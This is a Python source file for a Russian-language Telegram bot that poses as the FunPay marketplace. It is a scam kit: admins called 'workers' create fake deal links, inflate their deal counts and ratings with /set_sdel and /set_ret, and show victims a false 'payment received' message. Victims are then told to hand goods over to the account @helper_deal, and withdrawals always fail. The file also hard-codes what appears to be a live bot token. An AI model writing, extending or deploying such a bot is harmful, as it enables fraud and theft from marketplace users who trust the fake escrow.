import asyncio
import random
import string
import logging
import os
import glob
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command

# ===== КОНФИГ =====
BOT_TOKEN = "8871224360:AAEjVO4h1c_3nzM4u2BWBdVhmmpfiiUayjc"
ADMIN_FILE = "admins.txt"
GIF_FOLDER = "gifs"

# ===== ЗАГРУЗКА АДМИНОВ =====
def load_admins():
    try:
        with open(ADMIN_FILE, "r") as f:
            return [int(line.strip()) for line in f if line.strip().isdigit()]
    except:
        return []

ADMINS = load_admins()

# ===== ИНИЦИАЛИЗАЦИЯ =====
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())
logging.basicConfig(level=logging.INFO)

# ===== ФУНКЦИЯ ДЛЯ ГИФКИ =====
def get_gif():
    gif_files = glob.glob(os.path.join(GIF_FOLDER, "*.gif"))
    if gif_files:
        return gif_files[0]
    return None

async def send_with_gif(chat_id, text, keyboard=None):
    gif_path = get_gif()
    if gif_path:
        try:
            gif = InputFile(gif_path)
            await bot.send_animation(chat_id, animation=gif, caption=text, reply_markup=keyboard)
        except Exception as e:
            print(f"Ошибка с гифкой: {e}")
            await bot.send_message(chat_id, text, reply_markup=keyboard)
    else:
        await bot.send_message(chat_id, text, reply_markup=keyboard)

# ===== ФЕЙКОВЫЕ ДАННЫЕ =====
user_data = {}
deal_data = {}

def get_user(user_id):
    if user_id not in user_data:
        user_data[user_id] = {"balance": 300, "deals": 14, "rating": 4.9, "reviews": 18}
    return user_data[user_id]

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton(text="👤 Профиль", callback_data="profile"),
        InlineKeyboardButton(text="💰 Баланс", callback_data="balance")
    )
    keyboard.add(
        InlineKeyboardButton(text="📤 Вывод", callback_data="withdraw"),
        InlineKeyboardButton(text="📋 Сделки", callback_data="my_deals")
    )
    keyboard.add(
        InlineKeyboardButton(text="❓ Помощь", callback_data="help"),
        InlineKeyboardButton(text="🌐 Язык", callback_data="language")
    )
    return keyboard

def is_admin(user_id):
    return user_id in ADMINS

# ===== /START =====
@dp.message_handler(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    if is_admin(user_id):
        await send_with_gif(
            message.chat.id,
            "🔥 **Work**\nДобро пожаловать, воркер!",
            get_main_keyboard()
        )
    else:
        await send_with_gif(
            message.chat.id,
            "🤑 **FunPay | Бот**\n50 378 пользователей\n\nИспользуйте меню для навигации.",
            get_main_keyboard()
        )

# ===== КОМАНДА /buy ТОЛЬКО ДЛЯ АДМИНОВ =====
@dp.message_handler(Command("buy"))
async def create_deal(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("❌ Доступ запрещён. Только для воркеров.")
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❗ Используйте: /buy <код-сделки>\nПример: /buy #6sjn92j")
        return
    
    deal_code = args[1].replace("#", "")
    deal_id = generate_deal_id()
    
    deal_data[deal_id] = {
        "seller": user_id,
        "amount": 300,
        "status": "created",
        "code": deal_code
    }
    
    text = (
        f"✅ **Сделка создана!**\n\n"
        f"Номер сделки: #{deal_id}\n"
        f"Сумма: 300.0 🪙\n"
        f"Описание: член\n\n"
        f"Ссылка для покупателя:\n"
        f"`https://t.me/FunPaySafaryBot?start={deal_id}`\n\n"
        f"Отправьте эту ссылку покупателю для совершения оплаты!"
    )
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(text="📤 Поделиться ссылкой", callback_data=f"share_{deal_id}"),
        InlineKeyboardButton(text="❌ Отмена", callback_data="back_main")
    )
    await send_with_gif(message.chat.id, text, kb)

# ===== /set_sdel — НАКРУТКА СДЕЛОК =====
@dp.message_handler(Command("set_sdel"))
async def set_deals(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("❌ Доступ запрещён.")
        return
    
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("❗ Используйте: /set_sdel <количество>\nПример: /set_sdel 999")
        return
    
    count = int(args[1])
    user = get_user(user_id)
    user["deals"] = count
    
    await message.answer(f"✅ Успешные сделки установлены на: **{count}**")

# ===== /set_ret — НАКРУТКА РЕЙТИНГА =====
@dp.message_handler(Command("set_ret"))
async def set_rating(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("❌ Доступ запрещён.")
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❗ Используйте: /set_ret <оценка>\nПример: /set_ret 5.0")
        return
    
    try:
        rating = float(args[1].replace(",", "."))
        if rating < 1 or rating > 5:
            await message.answer("❌ Оценка должна быть от 1.0 до 5.0")
            return
    except:
        await message.answer("❌ Введите число от 1.0 до 5.0")
        return
    
    user = get_user(user_id)
    user["rating"] = rating
    
    if len(args) > 2 and args[2].isdigit():
        user["reviews"] = int(args[2])
    
    reviews = user["reviews"]
    await message.answer(f"✅ Рейтинг установлен: ★★★★★ {rating}/5 ({reviews} отзывов)")

# ===== /twodeal =====
@dp.message_handler(Command("twodeal"))
async def two_deal(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("❌ Доступ запрещён.")
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❗ Используйте: /twodeal <юз/айди>\nПример: /twodeal 123456789")
        return
    
    target_id = args[1]
    await message.answer(f"✅ Сообщение о второй сделке отправлено пользователю {target_id} (демо)")

# ===== /send =====
@dp.message_handler(Command("send"))
async def send_message_cmd(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("❌ Доступ запрещён.")
        return
    
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("❗ Используйте: /send <текст> <юз/айди>\nПример: /send Привет 123456789")
        return
    
    text = args[1]
    target_id = args[2]
    await message.answer(f"✅ Сообщение отправлено пользователю {target_id}: «{text}» (демо)")

# ===== /chat =====
@dp.message_handler(Command("chat"))
async def chat_history(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("❌ Доступ запрещён.")
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❗ Используйте: /chat <юз/айди>\nПример: /chat 123456789")
        return
    
    target_id = args[1]
    history = f"📜 История переписки с {target_id}:\n\n[19:40] Вы: Привет\n[19:41] {target_id}: Здравствуйте\n[19:42] Вы: Оплата прошла?"
    await message.answer(history)

# ===== ИНЛАЙН-КНОПКИ =====
@dp.callback_query_handler(lambda c: c.data == "profile")
async def show_profile(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user = get_user(user_id)
    text = (
        f"👤 **Профиль**\n"
        f"Баланс: **{user['balance']} STARS**\n"
        f"Успешные сделки: **{user['deals']}**\n"
        f"Уровень: Новичок\n"
        f"Комиссия: 3.0%\n"
        f"Рейтинг: ★★★★★ {user['rating']}/5 ({user['reviews']})"
    )
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(text="💳 Добавить кошелёк", callback_data="add_wallet"),
        InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")
    )
    await bot.edit_message_text(text, callback_query.message.chat.id, callback_query.message.message_id, reply_markup=kb)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "balance")
async def show_balance(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user = get_user(user_id)
    text = f"💰 **Ваш баланс:**\nSTARS: {user['balance']}\n\nOK"
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text="🔙 Назад", callback_data="back_main"))
    await bot.edit_message_text(text, callback_query.message.chat.id, callback_query.message.message_id, reply_markup=kb)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "withdraw")
async def withdraw_error(callback_query: types.CallbackQuery):
    await bot.edit_message_text(
        "❌ **Ошибка вывода**\n"
        "Не удалось обработать запрос. Проверьте данные кошелька или свяжитесь с поддержкой.\n"
        "Код ошибки: #WDR-42",
        callback_query.message.chat.id,
        callback_query.message.message_id
    )
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "my_deals")
async def my_deals(callback_query: types.CallbackQuery):
    deal_id = list(deal_data.keys())[0] if deal_data else "7bbd9e00"
    text = (
        f"📋 **Сделка #{deal_id}**\n"
        f"Сумма: 300.0 🪙\n"
        f"Описание: член\n"
        f"Комиссия: 3.0%\n"
        f"Статус: ✅ Завершена"
    )
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(text="📋 История", callback_data="deal_history"),
        InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")
    )
    await bot.edit_message_text(text, callback_query.message.chat.id, callback_query.message.message_id, reply_markup=kb)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "deal_history")
async def deal_history(callback_query: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text="🔙 Назад", callback_data="my_deals"))
    await bot.edit_message_text(
        "📜 **История сделок:**\n\n"
        "#7bbd9e00 — 300 STARS — ✅ Завершена\n"
        "#a1b2c3d4 — 150 STARS — ✅ Завершена\n"
        "#e5f6g7h8 — 500 STARS — ⏳ Ожидает",
        callback_query.message.chat.id,
        callback_query.message.message_id,
        reply_markup=kb
    )
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "add_wallet")
async def add_wallet(callback_query: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(text="➕ Добавить GRAM", callback_data="add_gram"),
        InlineKeyboardButton(text="➕ Добавить карту", callback_data="add_card"),
        InlineKeyboardButton(text="🔙 Назад", callback_data="profile")
    )
    await bot.edit_message_text("💳 **Выберите кошелёк для добавления:**", callback_query.message.chat.id, callback_query.message.message_id, reply_markup=kb)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("add_"))
async def fake_add_wallet(callback_query: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text="🔙 Назад", callback_data="profile"))
    await bot.edit_message_text(
        "✅ **Кошелёк добавлен**\n(демонстрационный режим)",
        callback_query.message.chat.id,
        callback_query.message.message_id,
        reply_markup=kb
    )
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "language")
async def language_menu(callback_query: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en"),
        InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"),
        InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")
    )
    await bot.edit_message_text("🌐 **Select language / Выберите язык:**", callback_query.message.chat.id, callback_query.message.message_id, reply_markup=kb)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("lang_"))
async def set_lang(callback_query: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text="🔙 Назад", callback_data="back_main"))
    await bot.edit_message_text(
        "✅ Язык изменён (демо)",
        callback_query.message.chat.id,
        callback_query.message.message_id,
        reply_markup=kb
    )
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "help")
async def referral(callback_query: types.CallbackQuery):
    ref_link = "https://t.me/FunPaySafaryBot?start=2b6f8b2e4b7c3b54"
    text = (
        f"🔍 **Реферальная программа:**\n\n"
        f"Приглашайте друзей и получайте вознаграждение!\n\n"
        f"⏳ Ваша ссылка:\n`{ref_link}`"
    )
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(text="📋 Копировать ссылку", callback_data="copy_ref"),
        InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")
    )
    await bot.edit_message_text(text, callback_query.message.chat.id, callback_query.message.message_id, reply_markup=kb)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "copy_ref")
async def copy_ref(callback_query: types.CallbackQuery):
    await callback_query.answer("Ссылка скопирована (в демо-режиме)", show_alert=True)

@dp.callback_query_handler(lambda c: c.data == "back_main")
async def back_main(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    if is_admin(user_id):
        text = "🔥 **Work**\nДобро пожаловать, воркер!"
    else:
        text = "🤑 **FunPay | Бот**\n50 378 пользователей\n\nИспользуйте меню для навигации."
    await bot.edit_message_text(text, callback_query.message.chat.id, callback_query.message.message_id, reply_markup=get_main_keyboard())
    await callback_query.answer()

# ===== ОБРАБОТЧИК ССЫЛОК =====
@dp.message_handler(Command("start"))
async def handle_start_deal(message: types.Message):
    args = message.text.split()
    if len(args) > 1:
        deal_id = args[1]
        if deal_id in deal_data:
            text = (
                f"💳 **Сделка #{deal_id}**\n"
                f"Сумма: 300.0 🪙\n"
                f"Описание: член\n"
                f"Комиссия: 3.0%\n\n"
                f"Оплата через поддержку:\n"
                f"Нажмите кнопку «Саппорт» ниже — оператор подскажет, как оплатить звёздами.\n\n"
                f"@helper_deal"
            )
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(
                InlineKeyboardButton(text="🆘 Саппорт", callback_data="support"),
                InlineKeyboardButton(text="✅ Оплатить", callback_data=f"pay_{deal_id}")
            )
            await send_with_gif(message.chat.id, text, kb)
            return
    await cmd_start(message)

@dp.callback_query_handler(lambda c: c.data.startswith("pay_"))
async def process_pay(callback_query: types.CallbackQuery):
    deal_id = callback_query.data.split("_")[1]
    if deal_id not in deal_data:
        await callback_query.answer("Сделка не найдена")
        return
    
    text = (
        f"✔ **Оплата по сделке #{deal_id} успешно получена!**\n"
        f"Продавец получил уведомление\n\n"
        f"Сделка #{deal_id}:\n"
        f"Сумма: 300.0 🟢\n"
        f"Описание: член\n"
        f"Комиссия: 3.0%\n\n"
        f"🟢 Статус сделки: покупатель успешно оплатил\n\n"
        f"❗ Дождитесь, пока продавец передаст товар на аккаунт @helper_deal, а затем подтвердите это в боте!"
    )
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(text="📦 Подтвердить передачу", callback_data=f"confirm_{deal_id}"),
        InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")
    )
    await bot.edit_message_text(text, callback_query.message.chat.id, callback_query.message.message_id, reply_markup=kb)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("confirm_"))
async def confirm_transfer(callback_query: types.CallbackQuery):
    deal_id = callback_query.data.split("_")[1]
    text = (
        f"✅ **Сделка #{deal_id} успешно завершена**\n\n"
        f"Пожалуйста, дождитесь поступления товара на ваш аккаунт!\n\n"
        f"Ожидайте поступления оплаты на указанный вами ранее кошелёк!"
    )
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text="🏠 Меню", callback_data="back_main"))
    await bot.edit_message_text(text, callback_query.message.chat.id, callback_query.message.message_id, reply_markup=kb)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "support")
async def support(callback_query: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(text="🔙 Назад", callback_data="back_main"))
    await bot.edit_message_text(
        "🆘 **Поддержка**\n"
        "Свяжитесь с оператором: @helper_deal\n"
        "Ожидайте ответа в течение 5-15 минут.",
        callback_query.message.chat.id,
        callback_query.message.message_id,
        reply_markup=kb
    )
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("share_"))
async def share_deal(callback_query: types.CallbackQuery):
    deal_id = callback_query.data.split("_")[1]
    text = (
        f"📤 **Отправить**\nВыберите чаты\n\n"
        f"По этой ссылке можно перейти на сделку со мной 😁\n"
        f"`https://t.me/FunPaySafaryBot?start={deal_id}`"
    )
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(text="📨 Telegram", callback_data="fake_share"),
        InlineKeyboardButton(text="❌ Отмена", callback_data="back_main")
    )
    await bot.edit_message_text(text, callback_query.message.chat.id, callback_query.message.message_id, reply_markup=kb)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "fake_share")
async def fake_share(callback_query: types.CallbackQuery):
    await callback_query.answer("✅ Ссылка отправлена (демо)", show_alert=True)
    await back_main(callback_query)

@dp.message_handler()
async def unknown(message: types.Message):
    await send_with_gif(
        message.chat.id,
        "❓ Неизвестная команда. Используйте /start для начала.",
        get_main_keyboard()
    )

# ===== ЗАПУСК =====
if __name__ == "__main__":
    print("🔥 Бот запущен. Админы:", ADMINS)
    print("📁 Гифки из папки:", GIF_FOLDER)
    executor.start_polling(dp, skip_updates=True)